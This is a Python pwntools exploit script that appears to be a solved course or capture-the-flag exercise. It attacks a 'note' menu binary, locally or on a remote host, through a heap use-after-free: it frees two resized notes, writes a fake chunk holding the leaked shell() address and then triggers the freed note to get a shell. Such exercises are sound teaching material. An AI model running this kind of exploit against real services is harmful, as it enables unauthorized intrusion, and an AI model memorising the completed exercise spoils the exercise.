#!/usr/bin/env python
from pwn import *

BINARY = "./note"

HOST = "3.34.49.33"
PORT = 1004

context.terminal = ["tmux", "split-window", "-h"]

# Load binary
elf = context.binary = ELF(BINARY)


# GDB script
gs = """
b *_write
b *_re_write
b *_read
b *_erase
"""


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(BINARY)


def attach_gdb(p: process):
    if args.REMOTE:
        return

    gdb.attach(p, gdbscript=gs)


class Note:
    def __init__(self, conn):
        self.conn = conn
        self.shell_addr = self._get_shell_addr()

    def _get_shell_addr(self):
        self.conn.recvuntil(b"[*] shell(): ")
        return int(self.conn.recvline().strip(), 16)

    def _menu(self, choice: int):
        self.conn.sendlineafter(b">>> ", str(choice).encode())

    def write(self, idx: int, script: bytes, emoj: int):
        self._menu(1)
        self.conn.sendlineafter(b"index(1 ~ 16): ", str(idx).encode())
        self.conn.sendlineafter(b"script: ", script)
        self.conn.sendlineafter(b">>> ", str(emoj).encode())

    def re_write(self, idx: int, script: bytes, emoj: int):
        self._menu(2)
        self.conn.sendlineafter(b"index(1 ~ 16): ", str(idx).encode())
        self.conn.sendlineafter(b"script: ", script)
        self.conn.sendlineafter(b">>> ", str(emoj).encode())

    def read(self, idx: int) -> bytes:
        self._menu(3)
        self.conn.sendlineafter(b"index(1 ~ 16): ", str(idx).encode())
        emoj = self.conn.recvline()
        self.conn.recvline()
        content = self.conn.recvline()
        return emoj + content

    def erase(self, idx: int):
        self._menu(4)
        self.conn.sendlineafter(b"index(1 ~ 16): ", str(idx).encode())

    def interactive(self):
        self.conn.interactive()


def print_content(content: bytes):
    try:
        print(f"Note content: {content.decode()}")
    except UnicodeDecodeError:
        parts = content.split(b"\n", 2)
        print(f"Note content: {parts[0].decode()}\n{parts[1]}")


def main():
    p = conn()

    if args.GDB:
        attach_gdb(p)

    note = Note(p)

    # TODO (Exercise 4.3):  Exploit the Use-After-Free vulnerability.
    # Complete the exploit by following these steps:
    #   1. Allocate and modify pages using the write and re_write functions.
    #   2. Free (erase) the allocated pages to create freed chunks.
    #   3. Allocate a new page and write carefully crafted data to exploit the UAF vulnerability.
    #   4. Trigger the vulnerable function to gain a shell.
    #
    # Hints:
    # - Use the "vis" command in gdb at each breakpoint to visualize the heap layout.
    # - Utilize all functionalities we implemented in the Note class (write, re_write, read, erase).
    # - It may be advantageous to allocate and modify two pages for this exploit.
    note.write(1, b"A" * 8, 1)
    note.write(2, b"B" * 8, 1)

    note.re_write(1, b"A" * 256, 3)
    note.re_write(2, b"B" * 256, 3)

    note.erase(1)
    note.erase(2)

    note.write(3, b"CCCCCCCC" + p64(note.shell_addr), 2)

    p.sendlineafter(b">>> ", str(3).encode())
    p.sendlineafter(b"index(1 ~ 16): ", str(1).encode())

    note.interactive()


if __name__ == "__main__":
    main()
